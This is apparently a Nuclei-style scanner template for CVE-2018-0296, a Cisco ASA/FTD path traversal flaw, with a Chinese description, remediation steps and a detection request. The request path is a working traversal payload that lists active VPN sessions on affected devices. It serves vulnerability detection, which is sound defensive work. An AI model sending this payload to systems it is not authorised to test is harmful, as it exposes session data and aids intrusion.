id: CVE-2018-0296
info:
  name: Cisco ASA path traversal vulnerability
  author:
  - l0ne1y
  description: |-
    Cisco ASA file_list.json path 文件读取漏洞
    Cisco 3000 Series Industrial Security Appliance（ISA）等都是美国思科（Cisco）公司的安全设备。ASA Software和Firepower Threat Defense (FTD) Software都是分别运行在不同设备中的操作系统。

    多款Cisco产品中的ASA Software和FTD Software的Web界面存在输入验证漏洞，该漏洞源于程序缺少对HTTP URL的正确验证。远程攻击者可通过向受影响设备发送特制的HTTP请求利用该漏洞造成拒绝服务或造成信息泄露。以下产品受到影响：Cisco 3000 Series Industrial Security Appliance (ISA)；ASA 1000V Cloud Firewall；ASA 5500 Series Adaptive Security Appliances；ASA 5500-X Series Next-Generation Firewalls；ASA Services Module for Cisco Catalyst 6500 Series Switches和Cisco 7600 Series Routers；Adaptive Security Virtual Appliance (ASAv)；Firepower 2100 Series Security Appliance；Firepower 4100 Series Security Appliance；Firepower 9300 ASA Security Module；FTD Virtual (FTDv)。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd

    临时修复方案：
    1、过滤\".\"，使用户在url中不能回溯上级目录。
    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
    5、用户下载文件之前进行权限校验。
requests:
- matchers:
  - type: word
    part: body
    words:
    - ///sessions
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions'
  method: GET
  headers:
    Accept-Encoding: deflate
